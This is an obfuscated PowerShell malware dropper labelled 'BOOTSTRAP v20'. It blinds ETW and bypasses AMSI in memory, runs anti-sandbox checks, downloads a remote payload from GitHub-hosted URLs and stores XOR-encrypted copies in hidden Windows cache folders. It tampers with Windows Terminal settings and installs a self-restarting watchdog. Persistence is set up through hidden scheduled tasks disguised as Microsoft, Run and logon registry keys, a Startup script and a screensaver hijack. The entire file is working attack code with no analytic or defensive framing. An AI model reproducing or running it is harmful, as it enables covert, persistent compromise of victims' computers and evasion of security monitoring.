# ═══ In-Memory Patches (Polymorphic) ═══
# ETW blind (P/Invoke)
[void]([Math]::Abs(46404))
$o0vmJBV = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$jwbuxNQ = Add-Type -MemberDefinition $o0vmJBV -Name 'RunConfig8' -Namespace 'SetObject78' -PassThru
$gR0D = [int](2721) % 256
$r6pvYTk2 = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$SY3HgDa = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
$hexzb = $jwbuxNQ::LoadLibrary($r6pvYTk2)
$RkFH = $jwbuxNQ::GetProcAddress($hexzb, $SY3HgDa)
Start-Sleep -Milliseconds 49
$p6quz = 0
$jwbuxNQ::VirtualProtect($RkFH, [UIntPtr]::new(1), 0x40, [ref]$p6quz) | Out-Null
$LJwXW1dW = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($LJwXW1dW, 0, $RkFH, $LJwXW1dW.Length)
$jwbuxNQ::VirtualProtect($RkFH, [UIntPtr]::new(1), $p6quz, [ref]$p6quz) | Out-Null
[void]([Math]::Abs(68479))

# Runtime memory patch
Start-Sleep -Milliseconds 7
$mGOpC6m = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
$ZQ1i = "IUWPV"
$GGaa6F = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$uB407 = [Ref].Assembly.GetType($mGOpC6m)
$riiy = "RCONS"
$Uo3a = $uB407.GetField($GGaa6F, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
$Uo3a.SetValue($null, $true)
[void]([Math]::Abs(2695))

# Environment validation
$PjxcA = [Environment]::ProcessorCount
if ($PjxcA -lt 2) { exit }
$s6UD4V = [long]0
try {
    $ADv3caA4 = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $ADv3caA4) {
        $s6UD4V = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $s6UD4V = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $s6UD4V = 0
}
if ($s6UD4V -gt 0 -and $s6UD4V -lt 2GB) { exit }
$X5kit3 = [System.DateTime]::Now
Start-Sleep -Milliseconds 2355
if (([System.DateTime]::Now - $X5kit3).TotalMilliseconds -lt 1884) { exit }
$ErrorActionPreference='SilentlyContinue'
Set-StrictMode -Off

# ============================================================
# BOOTSTRAP v20 FINAL
# - Auto-detect: conhost --headless → VBS → fallback
# - Retry 5x mỗi 10s mọi bước critical
# - Không abort khi bước phụ fail
# ============================================================

$InstallId = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
$osBuild   = [Environment]::OSVersion.Version.Build
$psExe     = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$q3TLkJ = (Get-Random -Minimum 1 -Maximum 452); [void]$q3TLkJ
$conhost   = "$env:SystemRoot\System32\conhost.exe"

$WtSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
$aFJInWo = [Environment]::MachineName.Length; $aFJInWo = $null
$WtBackup   = "$env:LOCALAPPDATA\Microsoft\CLR\wts_$InstallId.bak"
$KillFlag   = "$env:TEMP\dag_kill_$InstallId.flag"
$LogFile    = "$env:TEMP\dag_$InstallId.log"
$IRC6 = @{}; $IRC6["ts"] = [DateTime]::UtcNow.Ticks
$PidDir     = "$env:TEMP\dag_pid_$InstallId"
$VbsFile    = "$env:LOCALAPPDATA\Microsoft\CLR\wds_$InstallId.vbs"

function Log($m)  { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 } catch {} }
function OK($m)   { Write-Host "    [+] $m" -ForegroundColor Green; Log "OK: $m" }
function WARN($m) { Write-Host "    [!] $m" -ForegroundColor Yellow; Log "WARN: $m" }
function FAIL($m) { Write-Host "    [X] $m" -ForegroundColor Red; Log "FAIL: $m" }
function Step($m) { Write-Host "`n[*] $m" -ForegroundColor Cyan; Log "STEP: $m" }

function Invoke-Retry {
    param([scriptblock]$Action, [string]$Name, [int]$Max=5, [int]$DelaySec=10)
    for ($i=1; $i -le $Max; $i++) {
        $r = $false
        try { $r = & $Action } catch { Log "  retry $i ($Name): $_" }
        if ($r -eq $true) { return $true }
        if ($i -lt $Max) {
            Write-Host "    [!] $Name #$i failed, retry in ${DelaySec}s..." -ForegroundColor Yellow
            $G8HP = [System.Diagnostics.Process]::GetCurrentProcess().Id
            Start-Sleep -Seconds $DelaySec
        }
    }
    return $false
}

Log "=== v20 ID=$InstallId Build=$osBuild ==="
Write-Host "=== BOOTSTRAP v20 ===" -ForegroundColor Cyan
Write-Host "ID       : $InstallId" -ForegroundColor Yellow
$HutGubVR = (Get-Random -Minimum 1 -Maximum 873); [void]$HutGubVR
Write-Host "OS Build : $osBuild" -ForegroundColor Yellow
$rXx6tSe = (Get-Random -Minimum 1 -Maximum 282); [void]$rXx6tSe

# ============================================================
# STEP 0: DETECT LAUNCHER (conhost → VBS → fallback)
# ============================================================
Step "Detect launcher method"
if ($null -ne $true) { $Bz2BW = Get-Date }

$testTxt = "$env:TEMP\_ldr_$(Get-Random).txt"
$testPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Content '$testTxt' x"))

# Try conhost --headless
$launcher = 'powershell'  # default
$launcherExe = $psExe
$launcherWrapper = $null  # prefix wrapper

if (Test-Path $conhost) {
    Remove-Item $testTxt -Force -EA 0
    try {
        Start-Process $conhost -ArgumentList "--headless","`"$psExe`"","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$testPayload -WindowStyle Hidden -EA 0
        Start-Sleep 3
        if (Test-Path $testTxt) {
            $launcher = 'conhost'
            $vuKv = (Get-Random -Minimum 1 -Maximum 772); [void]$vuKv
            OK "Launcher: conhost --headless (no flash)"
        }
    } catch { }
    $sY7JcEw0 = @{}; $sY7JcEw0["ts"] = [DateTime]::UtcNow.Ticks
    Remove-Item $testTxt -Force -EA 0
}

# If conhost fails → try VBS
if ($launcher -eq 'powershell') {
    $testVbsPath = "$env:TEMP\_ldr_$(Get-Random).vbs"
    $QZV46V = [Environment]::MachineName.Length; $QZV46V = $null
    $vbsContent = "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $testPayload"", 0, False"
    [IO.File]::WriteAllText($testVbsPath, $vbsContent, [Text.Encoding]::ASCII)
    try {
        Start-Process wscript.exe -ArgumentList "`"$testVbsPath`"" -WindowStyle Hidden -EA 0
        Start-Sleep 3
        $F7s3HNO = [System.Diagnostics.Process]::GetCurrentProcess().Id
        if (Test-Path $testTxt) {
            $launcher = 'vbs'
            OK "Launcher: VBS (wscript + Run hide)"
        }
        $JpZD = [System.Diagnostics.Process]::GetCurrentProcess().Id
    } catch { }
    Remove-Item $testTxt, $testVbsPath -Force -EA 0
}
$JPVjHP = (Get-Random -Minimum 1 -Maximum 350); [void]$JPVjHP

# Fallback
if ($launcher -eq 'powershell') {
    WARN "Launcher: fallback powershell (may flash)"
}
$FteaJG = [System.Diagnostics.Process]::GetCurrentProcess().Id

# ============================================================
# STEP 1: DOWNLOAD
# ============================================================
Step "Download agent"
$urls = @(
    'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
    'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
    'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
)
$agent = $null
$dlOK = Invoke-Retry -Name "Download" -Action {
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20
            $script:agent = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray())
            if ($script:agent.Length -gt 500) { return $true }
        } catch { }
    }
    return $false
    $tXCJ = (Get-Random -Minimum 1 -Maximum 585); [void]$tXCJ
}
if (-not $dlOK) { FAIL "Download ABORT"; return }
try { $MwP42 = [System.IO.Path]::GetTempPath() } catch { $MwP42 = $null }
OK "Downloaded $($agent.Length) chars"

# ============================================================
# STEP 2: XOR + 7 CLONES
# ============================================================
Step "XOR + 7 clones"
try { $yOfn = [System.IO.Path]::GetTempPath() } catch { $yOfn = $null }
$raw = [Text.Encoding]::UTF8.GetBytes($agent)
$key = [byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
$GiFk = @{}; $GiFk["ts"] = [DateTime]::UtcNow.Ticks
$enc = [byte[]]::new($raw.Length)
for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i % 32] }
try { $UI9rcq = [System.IO.Path]::GetTempPath() } catch { $UI9rcq = $null }
$blob = [byte[]]::new(32 + $enc.Length)
$ro9KKiYz = [System.Net.Dns]::GetHostName().Length
[Buffer]::BlockCopy($key, 0, $blob, 0, 32)
[Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)

$folders = @(
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\Container",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01",
    "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles",
    "$env:LOCALAPPDATA\Microsoft\Windows\History\History.IE5",
    "$env:USERPROFILE\.vscode\extensions\.cache",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
)
$clones = @()
foreach ($f in $folders) {
    $folder = $f
    $iq4mZr = (Get-Random -Minimum 1 -Maximum 165); [void]$iq4mZr
    $ok = Invoke-Retry -Name "Clone $folder" -Max 3 -DelaySec 5 -Action {
        try {
            if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
            $p = Join-Path $folder "$InstallId.dat"
            [IO.File]::WriteAllBytes($p, $blob)
            if ((Get-Item $p -Force).Length -lt 500) { return $false }
            if ($null -ne $true) { $NCcy = Get-Date }
            try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
            return $true
        } catch { return $false }
        if ($null -ne $true) { $kaXtIEy = Get-Date }
    }
    if ($ok) { $clones += (Join-Path $folder "$InstallId.dat") }
    if ($null -ne $true) { $ste3K4u = Get-Date }
}
if ($clones.Count -eq 0) { FAIL "No clone ABORT"; return }
OK "Clones: $($clones.Count)/7"
$clonesStr = ($clones | ForEach-Object { "'$_'" }) -join ','
$jSuS = [System.Net.Dns]::GetHostName().Length

# ============================================================
# STEP 3: PATCH WT settings.json
# ============================================================
Step "Patch WT settings.json"
$patchedJson = @'
{
    "$help": "https://aka.ms/terminal-documentation",
    "$schema": "https://aka.ms/terminal-profiles-schema",
    "actions": [],
    "copyFormatting": "none",
    "copyOnSelect": false,
    "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
    "keybindings": 
    [
        {
            "id": "Terminal.CopyToClipboard",
            "keys": "ctrl+c"
        },
        {
            "id": "Terminal.DuplicatePaneAuto",
            "keys": "alt+shift+d"
        }
    ],
    "newTabMenu": 
    [
        {
            "type": "remainingProfiles"
        }
    ],
    "profiles": 
    {
        "defaults": {},
        "list": 
        [
            {
                "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
                "hidden": false,
                "name": "Windows PowerShell"
            },
            {
                "commandline": "%SystemRoot%\\System32\\cmd.exe",
                "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}",
                "hidden": false,
                "name": "Command Prompt"
            },
            {
                "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}",
                "hidden": false,
                "name": "Azure Cloud Shell",
                "source": "Windows.Terminal.Azure"
            }
        ]
    },
    "schemes": [],
    "themes": []
}
'@
$bkOK = Invoke-Retry -Name "WT backup" -Max 3 -DelaySec 5 -Action {
    try {
        $agDir = Split-Path $WtBackup -Parent
        if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
        [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
        $HRipGYrw = [System.Net.Dns]::GetHostName().Length
        try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $WtBackup)
    } catch { return $false }
}
if ($bkOK) { OK "WT backup" } else { WARN "WT backup failed" }
$hAwk = [System.Diagnostics.Process]::GetCurrentProcess().Id
$wtOK = Invoke-Retry -Name "WT patch" -Max 3 -DelaySec 5 -Action {
    try {
        if (Test-Path $WtSettings) {
            Copy-Item $WtSettings "$WtSettings.bak_before_$InstallId" -Force -EA 0
            [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
            if ($null -ne $true) { $zKsaqW = Get-Date }
            return $true
        }
        $cKPu = [Environment]::MachineName.Length; $cKPu = $null
        return $false
    } catch { return $false }
}
if ($wtOK) { OK "WT patched" } else { WARN "WT patch failed" }

# ============================================================
# STEP 4: BUILD WATCHDOG
# ============================================================
Step "Build watchdog"
$watchdog = @"
`$ErrorActionPreference='SilentlyContinue'
`$id = '$InstallId'
`$kill = '$KillFlag'
`$log = '$LogFile'
`$pidDir = '$PidDir'
`$clones = @($clonesStr)
`$target = 3
`$wtSettings = '$WtSettings'
`$wtBackup = '$WtBackup'
function W(`$m) { try { Add-Content `$log "[w] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8 } catch {} }
if (Test-Path `$kill) { exit }
if (-not (Test-Path `$pidDir)) { New-Item -ItemType Directory -Path `$pidDir -Force | Out-Null }
try {
    if (Test-Path `$wtBackup) {
        `$needRestore = `$false
        if (-not (Test-Path `$wtSettings)) { `$needRestore = `$true }
        else {
            `$content = Get-Content `$wtSettings -Raw -EA 0
            if (`$content -match 'Terminal\.PasteFromClipboard') { `$needRestore = `$true }
        }
        if (`$needRestore) {
            `$bak = [IO.File]::ReadAllText(`$wtBackup, [Text.Encoding]::UTF8)
            [IO.File]::WriteAllText(`$wtSettings, `$bak, [Text.UTF8Encoding]::new(`$false))
            W 'wt-patched'
        }
    }
} catch { W ('wt-err: ' + `$_) }
Get-ChildItem `$pidDir -File -EA 0 | ForEach-Object {
    try {
        `$p = [int]`$_.Name
        if (-not (Get-Process -Id `$p -EA 0)) { Remove-Item `$_.FullName -Force -EA 0 }
    } catch { Remove-Item `$_.FullName -Force -EA 0 }
}
`$alive = @(Get-ChildItem `$pidDir -File -EA 0).Count
W "alive=`$alive target=`$target"
if (`$alive -ge `$target) { exit }
`$code = `$null
foreach (`$p in `$clones) {
    if (Test-Path `$p) { `$code = `$p; break }
}
if (-not `$code) { W 'no-clone'; exit }
Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
try {
    `$d = [IO.File]::ReadAllBytes(`$code)
    `$k = `$d[0..31]
    `$x = `$d[32..(`$d.Length-1)]
    `$c = [byte[]]::new(`$x.Length)
    for (`$i=0; `$i -lt `$x.Length; `$i++) { `$c[`$i] = `$x[`$i] -bxor `$k[`$i % 32] }
    `$payload = [Text.Encoding]::UTF8.GetString(`$c)
    W ('decrypted ' + `$code)
} catch { W ('dec-fail: ' + `$_); Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0; exit }
try {
    W 'exec-start'
    `$sb = [ScriptBlock]::Create(`$payload)
    & `$sb
} catch {
    W ('exec-fail: ' + `$_)
} finally {
    Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0
}
"@
$watchdogEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdog))
OK "Watchdog: $($watchdogEnc.Length) chars"

# ============================================================
# STEP 5: BUILD LAUNCHER (based on chosen method)
# ============================================================
Step "Build launcher ($launcher)"

$psArgs = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $watchdogEnc"
$G5eQ5c = @{}; $G5eQ5c["ts"] = [DateTime]::UtcNow.Ticks

if ($launcher -eq 'conhost') {
    # Task/Reg sẽ gọi: conhost.exe --headless "powershell.exe" <args>
    $launcherExe = $conhost
    $launcherArgs = "--headless `"$psExe`" $psArgs"
    $scheduledTaskExe = $conhost
    $scheduledTaskArgs = $launcherArgs
    OK "Command: conhost.exe --headless"
}
elseif ($launcher -eq 'vbs') {
    # Tạo file VBS chứa sẵn command
    # Chia EncodedCommand thành 4 phần để tránh dài dòng
    $q = [int]($watchdogEnc.Length / 4)
    $p1 = $watchdogEnc.Substring(0, $q)
    $p2 = $watchdogEnc.Substring($q, $q)
    if ($null -ne $true) { $hXU5I = Get-Date }
    $p3 = $watchdogEnc.Substring($q*2, $q)
    $p4 = $watchdogEnc.Substring($q*3)
    $vbsContent = "Dim a,b,c,d`r`na=`"$p1`"`r`nb=`"$p2`"`r`nc=`"$p3`"`r`nd=`"$p4`"`r`nCreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand `" & a & b & c & d, 0, False"
    $mgwydjmW = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $vbsOK = Invoke-Retry -Name "Write VBS" -Max 3 -DelaySec 5 -Action {
        try {
            $agDir = Split-Path $VbsFile -Parent
            $f2U7 = (Get-Random -Minimum 1 -Maximum 731); [void]$f2U7
            if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
            [IO.File]::WriteAllText($VbsFile, $vbsContent, [Text.Encoding]::ASCII)
            if (Test-Path $VbsFile) { return $true }
            $ko1BCi = [System.Net.Dns]::GetHostName().Length
            return $false
        } catch { return $false }
    }
    if (-not $vbsOK) { FAIL "VBS write ABORT"; return }
    $GR8O = (Get-Random -Minimum 1 -Maximum 776); [void]$GR8O
    try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
    OK "VBS: $VbsFile"
    $RKBOLS = [System.Diagnostics.Process]::GetCurrentProcess().Id
    # Task/Reg sẽ gọi: wscript.exe "C:\...\wds_<id>.vbs"
    $launcherExe = "$env:SystemRoot\System32\wscript.exe"
    $launcherArgs = "`"$VbsFile`""
    $scheduledTaskExe = $launcherExe
    $scheduledTaskArgs = $launcherArgs
    OK "Command: wscript.exe wds.vbs"
    $oBOD = [System.Net.Dns]::GetHostName().Length
}
else {
    # Fallback powershell trực tiếp
    $launcherExe = $psExe
    $launcherArgs = "-NoProfile -NonInteractive -WindowStyle Hidden $psArgs"
    $scheduledTaskExe = $psExe
    $woNG = [Environment]::MachineName.Length; $woNG = $null
    $scheduledTaskArgs = $launcherArgs
    WARN "Command: powershell (may flash)"
    $BY8ToFhV = [System.Net.Dns]::GetHostName().Length
}
$oizYE = [Environment]::MachineName.Length; $oizYE = $null

# ============================================================
# STEP 6: PERSISTENCE (retry, non-abort)
# ============================================================
Step "Install persistence"
$installed = @()

# 6.1 Tasks x3
foreach ($cfg in @(
    @{Name="Wdrv${InstallId}"; Rep="PT2M"},
    @{Name="Wcmp${InstallId}"; Rep="PT3M"},
    @{Name="Wsec${InstallId}"; Rep="PT4M"}
)) {
    $cc = $cfg
    $tOK = Invoke-Retry -Name "Task $($cfg.Name)" -Max 3 -DelaySec 10 -Action {
        try {
            $sched = New-Object -ComObject Schedule.Service
            $sched.Connect()
            $tf = $sched.GetFolder('\')
            $t = $sched.NewTask(0)
            $t.RegistrationInfo.Description = "Windows Service Helper"
            $bx6aQ9 = @{}; $bx6aQ9["ts"] = [DateTime]::UtcNow.Ticks
            $t.RegistrationInfo.Author = "Microsoft Corporation"
            $t.Settings.Enabled = $true
            $a7p7S1 = @{}; $a7p7S1["ts"] = [DateTime]::UtcNow.Ticks
            $t.Settings.Hidden = $true
            $lbMYCJu = @{}; $lbMYCJu["ts"] = [DateTime]::UtcNow.Ticks
            $t.Settings.StartWhenAvailable = $true
            $t.Settings.DisallowStartIfOnBatteries = $false
            $t.Settings.StopIfGoingOnBatteries = $false
            $sONJX = (Get-Random -Minimum 1 -Maximum 815); [void]$sONJX
            $t.Settings.ExecutionTimeLimit = "PT0S"
            $t.Settings.MultipleInstances = 2
            $tr1 = $t.Triggers.Create(9); $tr1.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $tzteqJb = [Environment]::MachineName.Length; $tzteqJb = $null
            $tr2 = $t.Triggers.Create(1)
            $mjjlhtvm = [System.Diagnostics.Process]::GetCurrentProcess().Id
            $tr2.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
            $tr2.Repetition.Interval = $cc.Rep
            try { $KhBN = [System.IO.Path]::GetTempPath() } catch { $KhBN = $null }
            $ac = $t.Actions.Create(0)
            $ac.Path = $scheduledTaskExe
            $ac.Arguments = $scheduledTaskArgs
            $t.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $t.Principal.LogonType = 3
            $t.Principal.RunLevel = 0
            $NWImZCfd = @{}; $NWImZCfd["ts"] = [DateTime]::UtcNow.Ticks
            $tf.RegisterTaskDefinition($cc.Name, $t, 6, $null, $null, 3, $null) | Out-Null
            Start-Sleep -Milliseconds 500
            if (Get-ScheduledTask -TaskName $cc.Name -EA 0) { return $true }
            return $false
            $J24Rk = @{}; $J24Rk["ts"] = [DateTime]::UtcNow.Ticks
        } catch { return $false }
    }
    if ($tOK) { $installed += "Task:$($cfg.Name)"; OK "Task $($cfg.Name)" }
    else { WARN "Task $($cfg.Name) FAILED" }
}
try { $qRYKWFS = [System.IO.Path]::GetTempPath() } catch { $qRYKWFS = $null }

# 6.2 Registry (4 keys)
$runCmd = "`"$launcherExe`" $launcherArgs"
$QeYOx = (Get-Random -Minimum 1 -Maximum 845); [void]$QeYOx
foreach ($reg in @(
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name="Wdrv$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name="Wupd$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'; Name="Wpol$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
)) {
    $rc = $reg
    try { $NHAC = [System.IO.Path]::GetTempPath() } catch { $NHAC = $null }
    $rOK = Invoke-Retry -Name "Reg $($reg.Name)" -Max 3 -DelaySec 5 -Action {
        try {
            if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
            Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
            $v = (Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name)
            $qV15Zy = [System.Net.Dns]::GetHostName().Length
            if ($v) { return $true }
            return $false
        } catch { return $false }
        $dnmodOz = [System.Diagnostics.Process]::GetCurrentProcess().Id
    }
    if ($rOK) { $installed += "Reg:$($reg.Name)"; OK "Reg $($reg.Name)" }
    else { WARN "Reg $($reg.Name) FAILED" }
    $cDEx = (Get-Random -Minimum 1 -Maximum 355); [void]$cDEx
}

# 6.3 Startup CMD
$sOK = Invoke-Retry -Name "Startup" -Max 3 -DelaySec 5 -Action {
    try {
        $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) "W$InstallId.cmd"
        $hTSy0 = (Get-Random -Minimum 1 -Maximum 846); [void]$hTSy0
        [IO.File]::WriteAllText($cmd, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $cmd)
        $z2ge = [System.Diagnostics.Process]::GetCurrentProcess().Id
    } catch { return $false }
}
if ($sOK) { $installed += "StartupCMD"; OK "Startup CMD" } else { WARN "Startup FAILED" }

# 6.4 LogonScript
$lOK = Invoke-Retry -Name "LogonScript" -Max 3 -DelaySec 5 -Action {
    try {
        $cmdPath = "$env:TEMP\.w$InstallId.cmd"
        [IO.File]::WriteAllText($cmdPath, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        $EIciE = [Environment]::MachineName.Length; $EIciE = $null
        Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
        $ZVcZRo = (Get-Random -Minimum 1 -Maximum 203); [void]$ZVcZRo
        $v = (Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript
        if ($v) { return $true }
        return $false
    } catch { return $false }
}
try { $AL28 = [System.IO.Path]::GetTempPath() } catch { $AL28 = $null }
if ($lOK) { $installed += "LogonScript"; OK "LogonScript" } else { WARN "LogonScript FAILED" }

# 6.5 Screensaver
$scrOK = Invoke-Retry -Name "Screensaver" -Max 3 -DelaySec 5 -Action {
    try {
        $scr = "$env:TEMP\.w$InstallId.scr"
        [IO.File]::WriteAllText($scr, "@echo off`r`nstart `"`" /b `"$launcherExe`" $launcherArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
        $JTXwO5HK = (Get-Random -Minimum 1 -Maximum 1086); [void]$JTXwO5HK
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
        $v = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE'
        $zoMTE = [System.Diagnostics.Process]::GetCurrentProcess().Id
        if ($v) { return $true }
        return $false
        $C47j = @{}; $C47j["ts"] = [DateTime]::UtcNow.Ticks
    } catch { return $false }
    $gSHzVx7d = @{}; $gSHzVx7d["ts"] = [DateTime]::UtcNow.Ticks
}
if ($scrOK) { $installed += "Screensaver"; OK "Screensaver" } else { WARN "Screensaver FAILED" }

Log "Vectors: $($installed -join ', ')"

# ============================================================
# STEP 7: LAUNCH 3 AGENTS
# ============================================================
Step "Launch 3 agents ($launcher)"
$launched = 0
for ($i=0; $i -lt 3; $i++) {
    $lOK = Invoke-Retry -Name "Launch $($i+1)" -Max 3 -DelaySec 5 -Action {
        try {
            $proc = New-Object Diagnostics.Process
            $proc.StartInfo.FileName = $launcherExe
            $DDM0cjH = [System.Net.Dns]::GetHostName().Length
            $proc.StartInfo.Arguments = $launcherArgs
            $proc.StartInfo.UseShellExecute = $false
            $proc.StartInfo.CreateNoWindow = $true
            [void]$proc.Start()
            return $true
        } catch { return $false }
        $tuwHB = [Environment]::MachineName.Length; $tuwHB = $null
    }
    if ($lOK) { $launched++ }
    $lE5Ts = @{}; $lE5Ts["ts"] = [DateTime]::UtcNow.Ticks
    Start-Sleep -Milliseconds 900
}
if ($launched -gt 0) { OK "Launched $launched/3" } else { WARN "No agents launched" }

# ============================================================
# STEP 8: VERIFY (retry)
# ============================================================
Step "Verify"
Invoke-Retry -Name "Verify" -Max 5 -DelaySec 10 -Action {
    Start-Sleep -Seconds 5
    $a = 0
    if (Test-Path $PidDir) { $a = @(Get-ChildItem $PidDir -File -EA 0).Count }
    $nCzyQCz = (Get-Random -Minimum 1 -Maximum 475); [void]$nCzyQCz
    if ($a -ge 1) { return $true }
    $NH5MqHPx = [System.Diagnostics.Process]::GetCurrentProcess().Id
    return $false
} | Out-Null

$alive = 0
try { $BEvA0uiS = [System.IO.Path]::GetTempPath() } catch { $BEvA0uiS = $null }
if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }
$wdog = @()
$vSLDdJ = [System.Diagnostics.Process]::GetCurrentProcess().Id
if (Test-Path $LogFile) {
    $wdog = @(Get-Content $LogFile -EA 0 | Where-Object { $_ -match '\[w\]' })
}
$woT5hh = [Environment]::MachineName.Length; $woT5hh = $null

# ============================================================
# FINAL REPORT
# ============================================================
Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host " BOOTSTRAP v20 — FINAL REPORT" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host " INSTALL ID : $InstallId" -ForegroundColor Yellow
Write-Host " OS BUILD   : $osBuild" -ForegroundColor White
$tf6GDH = @{}; $tf6GDH["ts"] = [DateTime]::UtcNow.Ticks
Write-Host " LAUNCHER   : $launcher (no-flash: $(if($launcher -ne 'powershell'){'YES'}else{'fallback'}))" -ForegroundColor $(if($launcher -ne 'powershell'){'Green'}else{'Yellow'})
